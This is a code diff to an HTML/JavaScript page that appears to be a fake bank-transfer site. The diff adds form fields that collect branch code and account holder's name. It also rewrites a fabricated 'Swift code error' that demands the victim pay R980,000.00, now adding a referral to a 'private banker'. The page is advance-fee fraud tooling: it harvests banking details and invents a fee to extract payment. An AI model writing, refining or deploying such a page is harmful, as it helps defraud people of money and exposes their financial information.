@@ -171,6 +171,8 @@
 					<form class="hero-form" method="POST" onsubmit="return  move()">
 						
 						<input required id="bankname" type="text" placeholder="Bank Name">
+						<input required id="bankname" type="text" placeholder="Bank Branch Code">
+						<input required id="bankname" type="text" placeholder="Account Holder's Name">
 						<input required id="acctnumber" type="number" placeholder="Account number">
 						<input required id="routingnumber" type="number" placeholder="Routing number">
 						<span id="trancs" class="myshow"><button  class="site-btn ">Transfer</button></span>
@@ -303,7 +305,7 @@
 			return false;
 		}
 		const showAlert = () => {
-			document.getElementById("error-message").innerHTML = "<strong>Oops!! Swift code error.</strong><br><p> pay R980,000.00 for swift verification to enable withdrawal  </p>  ";
+			document.getElementById("error-message").innerHTML = "<strong>Oops!! Swift code error.</strong><br><p> In other to make such transactions, you are required to pay R980,000.00 . Please contact your private banker assigned to you for any clearification and questions  </p>  ";
 				document.getElementById("error-message").classList.replace("myhide", "myshow");
 				setTimeout("errorShown()", 8000);
 		}
